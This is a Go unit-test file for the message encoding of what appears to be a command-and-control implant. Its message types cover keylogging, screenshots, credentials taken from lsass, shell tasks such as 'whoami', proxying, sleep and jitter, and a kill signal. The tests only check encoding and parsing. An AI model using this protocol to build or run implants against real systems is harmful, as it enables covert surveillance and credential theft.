// csdev :: proto/tlv_test.go  --  TLV 编解码测试
package proto

import (
	"bytes"
	"errors"
	"testing"
)

func TestTLVRoundTrip(t *testing.T) {
	items := []TLV{
		NewTLVHeartbeat(1_700_000_000_123),
		NewTLVResult(&Result{TaskID: 7, Status: StatusOK, Out: []byte("done")}),
		NewTLVFileChunk(3, 4096, 1<<20, []byte{0xDE, 0xAD, 0xBE, 0xEF}),
		NewTLVProxyUp(9, []byte("chan")),
		NewTLVKeylog("key=value"),
		NewTLVScreenshot([]byte{0xFF, 0xD8, 0xFF, 0xE0}),
		NewTLVMetaUpdate([]string{"host", "user"}),
		NewTLVCredential(CredKindPassword, "alice", "P@ss", "lsass"),
		NewTLVTask(&Task{ID: 1, Class: CmdPSList, Alias: "ps"}),
		NewTLVChunkAck(3, 8192),
		NewTLVSetSleep(5000, 10),
		NewTLVKill(),
	}
	enc := EncodeTLVs(items...)

	got, err := ParseTLVs(enc)
	if err != nil {
		t.Fatalf("ParseTLVs 失败: %v", err)
	}
	if len(got) != len(items) {
		t.Fatalf("解析出 %d 条, 期望 %d", len(got), len(items))
	}
	for i := range items {
		if got[i].Type != items[i].Type {
			t.Fatalf("第 %d 条 type 0x%04X, 期望 0x%04X", i, got[i].Type, items[i].Type)
		}
		if !bytes.Equal(got[i].Data, items[i].Data) {
			t.Fatalf("第 %d 条 data 不一致", i)
		}
	}
	if !bytes.Equal(EncodeTLVs(got...), enc) {
		t.Fatal("二次编码与原始字节不一致")
	}
	// 空输入
	if items, err := ParseTLVs(nil); err != nil || len(items) != 0 {
		t.Fatalf("空输入应返回空列表, 实际 (%d, %v)", len(items), err)
	}
	if len(EncodeTLVs()) != 0 {
		t.Fatal("空 TLV 列表应编码为 0 字节")
	}
}

// TestParseTLVsMalformed 畸形输入必须返回 error, 绝不 panic。
func TestParseTLVsMalformed(t *testing.T) {
	// TLV 头为 [2B type][4B len] 共 6 字节
	cases := map[string][]byte{
		"只有类型":          {0x10},
		"类型+半个长度":       {0x10, 0x01, 0x00, 0x00},
		"声明长度超实际":       {0x10, 0x01, 0x00, 0x00, 0x00, 0x10},
		"第二条截断":         {0x10, 0x01, 0x00, 0x00, 0x00, 0x02, 0xAA, 0xBB,
		                 0x20, 0x02, 0x00, 0x00, 0x00, 0x05, 0x01},
		"长度 0xFFFFFFFF 但数据短": {0x10, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02},
	}
	for name, in := range cases {
		if _, err := ParseTLVs(in); err == nil {
			t.Fatalf("%s: 必须返回 error", name)
		} else if !errors.Is(err, ErrTruncated) {
			t.Fatalf("%s: 应可用 errors.Is(err, ErrTruncated) 匹配, 实际 %v", name, err)
		}
	}
	// 合法边界: 长度 0
	items, err := ParseTLVs([]byte{0x10, 0x01, 0x00, 0x00, 0x00, 0x00})
	if err != nil || len(items) != 1 || len(items[0].Data) != 0 {
		t.Fatalf("零长度 TLV 解析失败: %v", err)
	}
}

func TestTLVDataIsCopied(t *testing.T) {
	buf := EncodeTLVs(TLV{Type: 0x1005, Data: []byte("abc")})
	items, err := ParseTLVs(buf)
	if err != nil {
		t.Fatal(err)
	}
	for i := range buf {
		buf[i] = 0x00
	}
	if string(items[0].Data) != "abc" {
		t.Fatal("解析结果与输入缓冲区共享内存")
	}
}

func TestTLVEncodeTooLong(t *testing.T) {
	big := bytes.Repeat([]byte{0x41}, MaxTLVData+1)
	// EncodeTLVs: 跳过超长项, 不 panic
	enc := EncodeTLVs(TLV{Type: 0x1005, Data: big})
	if len(enc) != 0 {
		t.Fatalf("超长项应被跳过, 实际编码 %d 字节", len(enc))
	}
	enc2 := EncodeTLVs(TLV{Type: TLVHeartbeat, Data: make([]byte, 8)}, TLV{Type: 0x1005, Data: big})
	if items, err := ParseTLVs(enc2); err != nil || len(items) != 1 || items[0].Type != TLVHeartbeat {
		t.Fatalf("超长项应只丢弃自身: (%v, %v)", items, err)
	}
	// EncodeTLVsChecked: 严格报错
	if _, err := EncodeTLVsChecked(TLV{Type: 0x1005, Data: big}); err == nil {
		t.Fatal("Checked 版必须报错")
	}
	if _, err := EncodeTLVsChecked(TLV{Type: TLVKill}); err != nil {
		t.Fatalf("合法项不应报错: %v", err)
	}
}

func TestTLVSemanticsRoundTrip(t *testing.T) {
	// HEARTBEAT
	hb := NewTLVHeartbeat(0x0102030405060708)
	if ms, err := ParseTLVHeartbeat(hb); err != nil || ms != 0x0102030405060708 {
		t.Fatalf("HEARTBEAT 往返失败: %d, %v", ms, err)
	}
	if _, err := ParseTLVHeartbeat(TLV{Type: TLVHeartbeat, Data: make([]byte, 7)}); !errors.Is(err, ErrTruncated) {
		t.Fatalf("HEARTBEAT 短载荷应报 ErrTruncated, 实际 %v", err)
	}

	// RESULT
	res := &Result{TaskID: 0xCAFEBABE, Status: StatusPartial, Out: bytes.Repeat([]byte{0x5A}, 300)}
	gotRes, err := ParseTLVResult(NewTLVResult(res))
	if err != nil {
		t.Fatalf("RESULT 解析失败: %v", err)
	}
	if gotRes.TaskID != res.TaskID || gotRes.Status != res.Status || !bytes.Equal(gotRes.Out, res.Out) {
		t.Fatalf("RESULT 往返不一致: %s", gotRes)
	}

	// FILE_CHUNK
	fc := NewTLVFileChunk(0x11223344, 65536, 1<<20, bytes.Repeat([]byte{0x77}, 1024))
	gotFc, err := ParseTLVFileChunk(fc)
	if err != nil {
		t.Fatalf("FILE_CHUNK 解析失败: %v", err)
	}
	if gotFc.JobID != 0x11223344 || gotFc.Offset != 65536 || gotFc.Total != 1<<20 || len(gotFc.Data) != 1024 {
		t.Fatalf("FILE_CHUNK 往返不一致: %+v", gotFc)
	}
	if _, err := ParseTLVFileChunk(TLV{Type: TLVFileChunk, Data: make([]byte, 11)}); !errors.Is(err, ErrTruncated) {
		t.Fatalf("FILE_CHUNK 短载荷应报 ErrTruncated, 实际 %v", err)
	}
	// 超长文件块被截断到 TLV 上限内
	huge := NewTLVFileChunk(1, 0, 1<<20, make([]byte, MaxFileChunkData+1024))
	if len(huge.Data) != MaxTLVData {
		t.Fatalf("FILE_CHUNK 载荷 %d, 期望 %d", len(huge.Data), MaxTLVData)
	}
	if MaxFileChunkData != MaxTLVData-12 {
		t.Fatalf("MaxFileChunkData = %d", MaxFileChunkData)
	}

	// PROXY (上行 + 下行)
	pu, err := ParseTLVProxy(NewTLVProxyUp(0xABCD, []byte("up")))
	if err != nil || pu.ChanID != 0xABCD || string(pu.Data) != "up" {
		t.Fatalf("上行 PROXY_DATA 往返失败: %+v, %v", pu, err)
	}
	pd, err := ParseTLVProxy(NewTLVProxyDown(1, nil))
	if err != nil || pd.ChanID != 1 || len(pd.Data) != 0 {
		t.Fatalf("下行 PROXY_DATA 往返失败: %+v, %v", pd, err)
	}
	if _, err := ParseTLVProxy(TLV{Type: 0x9999}); err == nil {
		t.Fatal("非 PROXY_DATA 类型必须报错")
	}

	// KEYLOG / SCREEN
	if s, err := ParseTLVKeylog(NewTLVKeylog("hello 键击")); err != nil || s != "hello 键击" {
		t.Fatalf("KEYLOG 往返失败: %q, %v", s, err)
	}
	jpeg := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00}
	if b, err := ParseTLVScreenshot(NewTLVScreenshot(jpeg)); err != nil || !bytes.Equal(b, jpeg) {
		t.Fatalf("SCREEN 往返失败: %v", err)
	}

	// META_UPDATE
	mu, err := ParseTLVMetaUpdate(NewTLVMetaUpdate([]string{"h", "u", "x64"}))
	if err != nil || len(mu) != 3 || mu[2] != "x64" {
		t.Fatalf("META_UPDATE 往返失败: %v, %v", mu, err)
	}

	// CREDENTIAL
	cases := []Credential{
		{Kind: CredKindPassword, User: "alice", Secret: "P@ssw0rd", Source: "lsass"},
		{Kind: CredKindHash, User: "", Secret: "", Source: ""},
		{Kind: CredKindTicket, User: "u", Secret: "s", Source: "src"},
	}
	for _, c := range cases {
		got, err := ParseTLVCredential(NewTLVCredential(c.Kind, c.User, c.Secret, c.Source))
		if err != nil {
			t.Fatalf("CREDENTIAL 解析失败: %v", err)
		}
		if *got != c {
			t.Fatalf("CREDENTIAL 往返不一致: %+v != %+v", *got, c)
		}
	}
	// 逐段截断必须报错 (末位之前任意切点都不完整)
	full := NewTLVCredential(CredKindPassword, "alice", "secret", "lsass").Data
	for cut := 0; cut < len(full); cut++ {
		if _, err := ParseTLVCredential(TLV{Type: TLVCredential, Data: full[:cut]}); err == nil {
			t.Fatalf("CREDENTIAL 截断到 %d 字节时必须报错", cut)
		}
	}

	// SET_SLEEP
	ss := NewTLVSetSleep(60000, 25)
	if ms, j, err := ParseTLVSetSleep(ss); err != nil || ms != 60000 || j != 25 {
		t.Fatalf("SET_SLEEP 往返失败: %d/%d, %v", ms, j, err)
	}
	if _, _, err := ParseTLVSetSleep(TLV{Type: TLVSetSleep, Data: make([]byte, 4)}); err == nil {
		t.Fatal("SET_SLEEP 短载荷必须报错")
	}

	// CHUNK_ACK / KILL
	if jid, off, err := ParseTLVChunkAck(NewTLVChunkAck(5, 4096)); err != nil || jid != 5 || off != 4096 {
		t.Fatalf("CHUNK_ACK 往返失败: %d/%d, %v", jid, off, err)
	}
	if err := ParseTLVKill(NewTLVKill()); err != nil {
		t.Fatalf("KILL 校验失败: %v", err)
	}
	if err := ParseTLVKill(TLV{Type: TLVKill, Data: []byte{1}}); err == nil {
		t.Fatal("KILL 带载荷必须报错")
	}

	// TASK
	tk := &Task{ID: 12, Class: CmdExecShell, Alias: "shell", Arg: []byte("whoami")}
	gotTk, err := ParseTLVTask(NewTLVTask(tk))
	if err != nil {
		t.Fatalf("TASK 解析失败: %v", err)
	}
	if gotTk.ID != tk.ID || gotTk.Class != tk.Class || gotTk.Alias != tk.Alias || !bytes.Equal(gotTk.Arg, tk.Arg) {
		t.Fatalf("TASK 往返不一致: %s", gotTk)
	}
}

func TestTLVTypeMismatch(t *testing.T) {
	wrong := TLV{Type: 0xDEAD, Data: make([]byte, 16)}
	checks := []struct {
		name string
		err  error
	}{
		{"HEARTBEAT", errOf(ParseTLVHeartbeat, wrong)},
		{"RESULT", errOfResult(wrong)},
		{"FILE_CHUNK", errOfFileChunk(wrong)},
		{"CREDENTIAL", errOfCredential(wrong)},
		{"TASK", errOfTask(wrong)},
		{"META_UPDATE", errOfMeta(wrong)},
		{"KEYLOG", errOfKeylog(wrong)},
		{"SCREEN", errOfScreen(wrong)},
		{"SET_SLEEP", errOfSetSleep(wrong)},
	}
	for _, c := range checks {
		if c.err == nil {
			t.Fatalf("%s: 类型不匹配必须报错", c.name)
		}
		if errors.Is(c.err, ErrTruncated) {
			t.Fatalf("%s: 类型不匹配不应报 ErrTruncated, 实际 %v", c.name, c.err)
		}
	}
	if _, _, err := ParseTLVChunkAck(wrong); err == nil {
		t.Fatal("CHUNK_ACK: 类型不匹配必须报错")
	}
}

// 下面几个小包装避免在表里写多返回值闭包, 保持测试表扁平。
func errOf(f func(TLV) (uint64, error), t TLV) error { _, err := f(t); return err }
func errOfResult(t TLV) error                        { _, err := ParseTLVResult(t); return err }
func errOfFileChunk(t TLV) error                     { _, err := ParseTLVFileChunk(t); return err }
func errOfCredential(t TLV) error                    { _, err := ParseTLVCredential(t); return err }
func errOfTask(t TLV) error                          { _, err := ParseTLVTask(t); return err }
func errOfMeta(t TLV) error                          { _, err := ParseTLVMetaUpdate(t); return err }
func errOfKeylog(t TLV) error                        { _, err := ParseTLVKeylog(t); return err }
func errOfScreen(t TLV) error                        { _, err := ParseTLVScreenshot(t); return err }
func errOfSetSleep(t TLV) error                      { _, _, err := ParseTLVSetSleep(t); return err }

func TestTLVFindFilter(t *testing.T) {
	items := []TLV{
		{Type: TLVHeartbeat, Data: []byte{0}},
		{Type: TLVResult, Data: []byte{1}},
		{Type: TLVResult, Data: []byte{2}},
	}
	if got, ok := FindTLV(items, TLVResult); !ok || got.Data[0] != 1 {
		t.Fatalf("FindTLV 应返回第一条: %v %v", got, ok)
	}
	if _, ok := FindTLV(items, 0x9999); ok {
		t.Fatal("FindTLV 未命中应返回 false")
	}
	if got := FilterTLV(items, TLVResult); len(got) != 2 || got[1].Data[0] != 2 {
		t.Fatalf("FilterTLV 结果错误: %v", got)
	}
	if got := FilterTLV(items, 0x9999); got != nil {
		t.Fatalf("FilterTLV 未命中应返回 nil, 实际 %v", got)
	}
}

func TestByteOrderHelpers(t *testing.T) {
	b := make([]byte, 4)
	PutBE32(b, 0x01020304)
	if b[0] != 0x01 || b[3] != 0x04 {
		t.Fatalf("PutBE32 字节序错误: % X", b)
	}
	if BE32(b) != 0x01020304 {
		t.Fatal("BE32 读值错误")
	}
	PutBE16(b, 0xA1B2)
	if b[0] != 0xA1 || b[1] != 0xB2 || BE16(b) != 0xA1B2 {
		t.Fatalf("BE16/PutBE16 字节序错误: % X", b)
	}
	// 越界不 panic
	if BE32(b[:2]) != 0 || BE16(b[:1]) != 0 {
		t.Fatal("越界读应返回 0")
	}
	PutBE32(b[:2], 1)
	PutBE16(b[:1], 1)
	if !bytes.Equal(appendBE32(nil, 0x11223344), []byte{0x11, 0x22, 0x33, 0x44}) {
		t.Fatal("appendBE32 编码错误")
	}
	if !bytes.Equal(appendBE16(nil, 0x1122), []byte{0x11, 0x22}) {
		t.Fatal("appendBE16 编码错误")
	}
}

func TestCredKindName(t *testing.T) {
	if CredKindName(CredKindPassword) != "password" || CredKindName(CredKindHash) != "hash" {
		t.Fatal("凭据 kind 名映射错误")
	}
	if CredKindName(99) != "kind-99" {
		t.Fatalf("未知 kind 名错误: %s", CredKindName(99))
	}
}
